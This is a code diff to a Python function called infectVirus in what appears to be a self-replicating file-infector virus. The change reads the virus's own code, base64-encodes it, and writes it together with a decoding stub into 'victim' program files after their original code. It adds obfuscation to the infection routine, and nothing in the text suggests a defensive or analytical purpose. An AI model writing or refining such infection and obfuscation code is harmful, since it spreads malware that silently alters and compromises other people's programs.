@@ -59,14 +59,18 @@ def infectVirus():
             newCode = []
             newCode.extend(programCode + "\n")
 
-            #virusCode = getVirusCode()
-            #encryptedVirusCode = base64.b64encode(virusCode.encode("utf-8"))
-
-            #newCode.extend(encryptedVirusCode.decode("utf-8"))
             newCode.extend(getED())
-            newCode.extend(getVirusCode())
+
+            virusCode = str()
+            lines = getVirusCode()
+            for line in lines:
+                virusCode = virusCode + line
+            
+            encryptedVirusCode = base64.b64encode(virusCode.encode("utf-8"))
+
+            newCode.extend(encryptedVirusCode.decode("utf-8"))
+            
             fileHandler = open(victim,"w")
-            #fileHandler.write(encodedCode.decode('utf-8'))
             fileHandler.writelines(newCode)
             fileHandler.close() 
 
